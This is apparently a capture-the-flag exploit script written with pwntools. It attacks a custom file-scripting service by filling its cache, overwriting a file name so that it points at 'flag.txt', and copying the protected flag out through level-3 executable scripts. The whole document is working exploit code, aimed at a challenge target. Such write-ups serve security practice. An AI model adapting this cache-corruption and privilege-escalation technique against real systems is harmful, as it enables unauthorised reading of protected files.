from pwn import *
import sys
import string


def encode_string(buf: str) -> str:
    buf = buf.replace('\\', '\\\\')
    buf = buf.replace('"', '\\"')
    return '"' + buf + '"'


if __name__ == "__main__":
    if args.local:
        p = process(['./run.sh'])
    else:
        p = remote(sys.argv[1], sys.argv[2])

    p.recvuntil('> ')

    # 1. Fill cache slots
    for i in range(9):
        p.sendline('createfile("aaaaaaaa", 256, 1)')
        p.sendline('createfile("bbbbbbbb", 80, 1)')
        p.sendline('createfile("cccccccc", 80, 1)')
        p.sendline('createfile("dddddddd", 80, 1)')

    p.sendline('createfile("bbbbbbbb", 80, 1)')

    # 2. Manipulate file name of "bbbbbbbb" to "flag.txt"
    p.sendline('write("aaaaaaaa", {}, 256)'.format(encode_string("flag.txt")))

    # 3. copy the "flag.txt" to "flagflag"
    p.sendline('createfile("ex", 100, 3)')
    p.sendline('write("ex", {}, 0)'.format(
        encode_string(
            'createfile("flagflag", 32, 3);write("flagflag",read("flag.txt",0,size("flag.txt")),0)'
        )))

    p.sendline('execute("ex")')

    # 4. Remove "flag.txt" and reference "flag.txt" to register it.
    p.sendline('remove("flag.txt")')

    for i in range(10):
        p.sendline('createfile("flag.txt", 80, 1)')

    # 5. Delete the manipulated one by referencing the original cache entry.
    p.sendline('remove("bbbbbbbb")')

    # 6 & 7. Create file of level 3 and copy the flag to this one.
    p.sendline('createfile("ex2", 200, 3)')
    p.sendline('write("ex2", {}, 0)'.format(
        encode_string(
            f'createfile("leaked", 32, 3);write("leaked",read("flagflag", 0, 32),0)')
    ))
    p.sendline('execute("ex2")')

    # 8. Read the "flag.txt"
    p.sendline('print(read("flag.txt", 0, 32))')

    p.interactive()
